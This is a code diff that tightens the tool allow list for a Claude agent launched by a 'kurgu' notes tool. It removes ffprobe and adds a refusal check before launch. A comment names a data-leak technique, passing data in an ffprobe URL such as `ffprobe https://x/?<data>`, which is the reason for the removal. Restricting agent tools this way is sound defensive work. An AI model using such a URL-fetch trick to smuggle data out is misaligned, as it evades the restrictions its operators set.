@@ -226,7 +226,7 @@ WAKE_PROMPT = ("Kurgu'dan yeni notlar geldi. `kurgu notes wait {dir} --timeout 0
                "`kurgu notes done {dir} <id> --reply ...` ile kapat.")
 
 
-CLAUDE_TOOLS = "Bash(kurgu notes:*),Bash(ffprobe:*),mcp__kurgu"     # read-only probing (ffprobe) is fine; no general Bash, no ffmpeg (it could write files)
+CLAUDE_TOOLS = "Bash(kurgu notes:*),mcp__kurgu"     # no ffprobe (it can fetch URLs: `ffprobe https://x/?<data>` would leak), no general Bash, no ffmpeg
 
 
 def kurgu_launcher():
@@ -275,6 +275,11 @@ def wake_main(argv):
     if not exe:
         print(f"kurgu wake: `{agent}` was not found on PATH", file=sys.stderr)
         return 127
+    import agent_notes
+    why = agent_notes.shim_refusal(exe, [d, *argv[2:3]])
+    if why:
+        print(f"kurgu wake: {why}", file=sys.stderr)
+        return 1
     rc = 1
     for n, (label, cmd) in enumerate(wake_attempts(agent, d)):
         print(f"kurgu wake: {agent}, {label}" + (f" (send #{argv[2]})" if len(argv) > 2 else ""), flush=True)
